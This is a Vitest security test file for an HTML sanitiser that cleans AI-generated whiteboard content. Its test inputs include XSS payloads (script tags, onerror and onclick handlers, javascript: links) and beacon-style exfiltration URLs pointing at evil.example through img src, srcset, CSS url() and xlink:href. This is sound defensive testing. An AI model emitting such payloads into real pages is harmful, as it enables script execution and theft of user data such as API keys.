/** @vitest-environment jsdom */

/**
 * 净化 AI 写的 HTML —— 安全测试
 *
 * 这是本项目**最需要测试**的一块：净化写错的后果是「模型可以在用户的 App 里
 * 执行任意代码」，而本地 App 里最值钱的东西就是用户的 API Key。
 *
 * 测试的写法说明：断言的不是"净化后长什么样"（那随 DOMPurify 版本会变），
 * 而是**危险的东西必须不见了** —— 这样测试更稳，也更贴近我们真正关心的性质。
 */

import { describe, expect, it } from 'vitest';

import { sanitizeBoardHtml } from './sanitize';

describe('正常内容要保留', () => {
  it('普通 HTML 标签与文字', () => {
    const out = sanitizeBoardHtml('<p>一元二次方程</p><strong>重点</strong>');
    expect(out).toContain('<p>一元二次方程</p>');
    expect(out).toContain('<strong>重点</strong>');
  });

  it('表格、列表、代码块', () => {
    const html =
      '<table><tr><td>1</td></tr></table><ul><li>要点</li></ul><pre><code>x = 1</code></pre>';
    const out = sanitizeBoardHtml(html);
    expect(out).toContain('<table>');
    expect(out).toContain('<li>要点</li>');
    expect(out).toContain('<code>x = 1</code>');
  });

  it('MathML 公式（这是白板相对聊天框的核心优势）', () => {
    const html =
      '<math display="block"><mi>a</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>b</mi><mi>x</mi><mo>=</mo><mn>0</mn></math>';
    const out = sanitizeBoardHtml(html);
    expect(out).toContain('<math');
    expect(out).toContain('<msup>');
    expect(out).toContain('display="block"');
  });

  // ↓↓↓ 这一组是回归测试，别删 ↓↓↓
  //
  // 曾经踩过的坑：为了挡外链，把 ALLOWED_URI_REGEXP 收成"只允许 data:"。
  // 但它是**所有属性的通用值过滤器**，结果 viewBox="0 0 10 10"、
  // display="block" 这类根本不是 URL 的值也被判非法、属性被整个删掉 ——
  // SVG 图形和 MathML 公式全被毁掉，而且页面上不会报任何错。
  //
  // 修法：不设 ALLOWED_URI_REGEXP，改用钩子只针对"能加载资源的那几个属性"检查。
  it('SVG 的几何属性必须保留（否则图形直接废掉）', () => {
    const out = sanitizeBoardHtml(
      '<svg viewBox="0 0 10 10" width="10" height="10"><circle cx="5" cy="5" r="4" fill="#f00"/></svg>',
    );
    expect(out).toContain('viewBox="0 0 10 10"');
    expect(out).toContain('cx="5"');
    expect(out).toContain('cy="5"');
    expect(out).toContain('r="4"');
    expect(out).toContain('fill="#f00"');
  });

  it('MathML 的排版属性必须保留（否则公式会变形）', () => {
    const out = sanitizeBoardHtml(
      '<math display="block"><mspace width="1em"></mspace><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi></math>',
    );
    expect(out).toContain('display="block"');
    expect(out).toContain('width="1em"');
    expect(out).toContain('stretchy="false"');
    expect(out).toContain('mathvariant="bold"');
  });

  it('SVG 图形', () => {
    const out = sanitizeBoardHtml('<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4"/></svg>');
    expect(out).toContain('<svg');
    expect(out).toContain('<circle');
  });

  it('我们自己的区域标记 data-stage-region', () => {
    const out = sanitizeBoardHtml('<section data-stage-region="讲解-1"><p>x</p></section>');
    expect(out).toContain('data-stage-region="讲解-1"');
  });

  it('内联样式里的普通属性（颜色、字号）', () => {
    const out = sanitizeBoardHtml('<p style="color: #e5484d; font-weight: 600">重点</p>');
    expect(out).toContain('color: #e5484d');
  });
});

describe('可执行的东西必须被去掉', () => {
  it('<script> 整块消失', () => {
    const out = sanitizeBoardHtml('<p>前</p><script>alert(1)</script><p>后</p>');
    expect(out).not.toContain('script');
    expect(out).not.toContain('alert');
    expect(out).toContain('<p>前</p>');
  });

  it('事件属性 onerror / onclick 被去掉', () => {
    const out = sanitizeBoardHtml('<img src="x" onerror="alert(1)"><p onclick="alert(2)">点我</p>');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('alert');
  });

  it('javascript: 伪协议被去掉', () => {
    const out = sanitizeBoardHtml('<a href="javascript:alert(1)">点我</a>');
    expect(out).not.toContain('javascript:');
  });

  it('<iframe> 被去掉（它能把外部页面嵌进来）', () => {
    const out = sanitizeBoardHtml('<iframe src="https://evil.example/x"></iframe><p>ok</p>');
    expect(out).not.toContain('iframe');
    expect(out).not.toContain('evil.example');
  });

  it('<style> 整块被去掉（避免污染整个 App 的样式）', () => {
    const out = sanitizeBoardHtml('<style>body{display:none}</style><p>ok</p>');
    expect(out).not.toContain('<style');
    expect(out).not.toContain('display:none');
  });

  it('表单元素被去掉（本地 App 里没有理由出现）', () => {
    const out = sanitizeBoardHtml('<form action="https://evil.example"><input name="x"></form>');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<input');
  });
});

describe('★ 断掉一切对外发送数据的通道', () => {
  it('外链图片的 src 被剥掉（否则可以拿它当信标外发数据）', () => {
    const out = sanitizeBoardHtml('<img src="https://evil.example/collect?data=secret">');
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('https://');
  });

  it('srcset 被去掉（它能绕过对 src 的限制）', () => {
    const out = sanitizeBoardHtml('<img srcset="https://evil.example/a.png 2x">');
    expect(out).not.toContain('evil.example');
  });

  it('内联样式里的 url(...) 被去掉', () => {
    const out = sanitizeBoardHtml('<div style="background: url(https://evil.example/x)">x</div>');
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('url(');
  });

  it('SVG 的 xlink:href 被去掉', () => {
    const out = sanitizeBoardHtml(
      '<svg><use xlink:href="https://evil.example/x.svg"></use></svg>',
    );
    expect(out).not.toContain('evil.example');
  });

  it('data: 开头的图片是允许的（本地内嵌图形要用）', () => {
    const dataUrl = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
    const out = sanitizeBoardHtml(`<img src="${dataUrl}">`);
    expect(out).toContain('data:image/png;base64,');
  });
});

describe('边界情况', () => {
  it('空字符串不炸', () => {
    expect(sanitizeBoardHtml('')).toBe('');
  });

  it('纯文本原样返回', () => {
    expect(sanitizeBoardHtml('就是一句话')).toContain('就是一句话');
  });

  it('嵌套的恶意内容也会被清掉', () => {
    const out = sanitizeBoardHtml(
      '<div><p><span><img src="https://evil.example/x" onerror="alert(1)"></span></p></div>',
    );
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('onerror');
  });

  it('多次调用结果一致（钩子不会叠加出问题）', () => {
    const a = sanitizeBoardHtml('<p style="color:red">x</p>');
    const b = sanitizeBoardHtml('<p style="color:red">x</p>');
    expect(a).toBe(b);
  });
});
